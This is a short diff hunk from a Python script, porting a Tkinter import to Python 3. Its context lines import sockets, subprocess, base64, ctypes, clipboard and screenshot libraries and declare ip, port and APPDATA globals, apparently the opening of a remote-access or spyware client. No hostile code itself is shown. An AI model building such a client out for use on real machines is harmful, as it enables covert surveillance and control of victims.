@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
-import Tkinter as tk
+import tkinter as tk
 from mss import mss
 
 global ip,port,TMP,APPDATA,path
